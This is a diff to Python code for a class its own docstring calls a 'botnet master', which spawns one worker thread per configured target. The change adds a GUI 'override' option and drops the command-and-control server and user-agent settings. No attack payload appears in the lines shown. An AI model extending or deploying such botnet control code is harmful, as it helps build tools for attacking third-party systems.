@@ -138,24 +138,23 @@ class AllSafeWorker(Thread):
 
 
 class AllSafeWorkerMaster():
-    def __init__(self, config_file):
+    def __init__(self, config_file, override=False):
         """
         This class represents the botnet master as the thread who is in command to launch every 
         thread execution in order to fulfill botnet requiremets. It accepts a configuration file
         as main 
 
-        @param: config_file, filename - path for the configuration file 
+        @param: config_file, filename - path for the configuration file
+        @param: override, boolean - optional param to set the botnet in override mode (params set by GUI)
         """
         # parsing the configuration file to return a configuration dictionary
-        self._configuration = validateConfigFile(config_file)
+        self._configuration = validateConfigFile(config_file, override)
         if self._configuration == None:
             raise Exception("Configuration file is not properly formatted!")
 
         # configuring the master
-        self._modified = long(self._configuration["last_modified"])
-        self._agent    = self._configuration["user_agent_b"]
-        self._remote   = self._configuration["cc_server"]
         self._log      = self._configuration["log_file"]
+        self._targets  = self._configuration["targets"]
 
         # initializing workers array
         self._workers = []
@@ -172,11 +171,11 @@ class AllSafeWorkerMaster():
         # logging the initialization routine - start
         logInfo(self._log, "------------------- <SETUP> -------------------")
 
-        for i in range(0, len(self._configuration["targets"])):
+        for i in range(0, len(self._targets)):
             # iterating over the target list we initialize every worker
             # and their log section
             self._workers_log[i] = [] 
-            worker = AllSafeWorker(i, "worker-" + str(i), self._configuration["targets"][i])
+            worker = AllSafeWorker(i, "worker-" + str(i), self._targets[i])
             # logging worker reference
             logInfo(self._log, worker.getWorkerTarget())
 
